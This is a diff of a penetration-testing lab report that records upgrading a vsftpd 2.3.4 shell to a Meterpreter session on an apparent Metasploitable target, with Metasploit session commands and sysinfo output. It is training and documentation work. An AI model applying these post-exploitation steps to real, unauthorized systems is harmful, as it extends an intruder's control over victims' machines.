@@ -19,25 +19,22 @@ To upgrade the command shell session obtained during the Controlled Exploitation
 ### Step 1: Background the Active Shell Session
 
 #### Command Used
-```bash
-background
-```
+```background```
 
 #### Explanation
 The command shell session obtained from the `vsftpd 2.3.4` exploit was backgrounded within Metasploit so it could be upgraded to a Meterpreter session, which supports structured post-exploitation commands.
 
 #### Results
-- Session Backgrounded: `[Yes/No]`
-- Session ID: `[Record actual session ID, e.g. 1]`
+- Session Backgrounded: `Yes`
+- Session ID: `1`
 
 <img src="./Images/Phase_6/Phase_6_1.png" height="200px"><br>
+
 
 ### Step 2: Confirm the Active Session
 
 #### Command Used
-```bash
-sessions -l
-```
+```sessions -l```
 
 #### Explanation
 Listed active sessions to confirm the session ID of the backgrounded command shell before upgrading it.
@@ -46,68 +43,58 @@ Listed active sessions to confirm the session ID of the backgrounded command she
 
 | Session ID | Type | Target |
 |---|---|---|
-| `[Record actual ID]` | `shell` | `192.168.56.7` |
+| `1` | `shell` | `192.168.56.7` |
 
-<img src="../Images/Phase_6/step2_session_list.png" height="200px"><br>
 
 ### Step 3: Upgrade the Shell to a Meterpreter Session
 
 #### Command Used
-```bash
-sessions -u 1
-```
+
+```sessions -u 1```
 
 
 #### Results
-- Upgrade Status: `[Record actual result]`
-- New Meterpreter Session ID: `[Record actual session ID, e.g. 2]`
-
-<img src="../Images/Phase_6/step3_session_upgrade.png" height="200px"><br>
+- Upgrade Status: `100.00%`
+- New Meterpreter Session ID: `2`
 
 ### Step 4: Interact With the Meterpreter Session
 
 #### Command Used
-```bash
-sessions -i 2
-```
+
+```sessions -i 2```
 
 #### Explanation
 Interacted with the newly created Meterpreter session to begin running post-exploitation commands.
 
-<img src="../Images/Phase_6/step4_session_interact.png" height="200px"><br>
-
 ### Step 5: Run System Information Command
 
 #### Command Used
-```bash
-sysinfo
-```
+
+```sysinfo```
 
 #### Explanation
 Retrieved system information from the target, including hostname, OS, and architecture, to confirm details about the compromised machine.
 
 <img src="./Images/Phase_6/Phase_6_2.png" height="200px"><br>
 
+
 #### Results
 
 | Field | Observed Output |
 |---|---|
-| Computer | `[Record actual output]` |
-| OS | `[Record actual output]` |
-| Architecture | `[Record actual output]` |
-| Meterpreter | `[Record actual output]` |
+| Computer | `metasploitablw.localdomain` |
+| OS | `Ubuntu 8.04` |
+| Architecture | `i686` |
+| Meterpreter | `x86/linux` |
 
 ### Step 7: End the Session
 
 #### Command Used
-```bash
-exit
-```
+
+```exit```
 
 #### Explanation
 Once post-exploitation commands were run and documented, the Meterpreter session was closed. No files were created, modified, or deleted on the target, and no persistence mechanism was installed, in accordance with the rules of engagement.
-
-<img src="../Images/Phase_6/step5_sysinfo.png" height="200px"><br>
 
 ## Security Observations
 
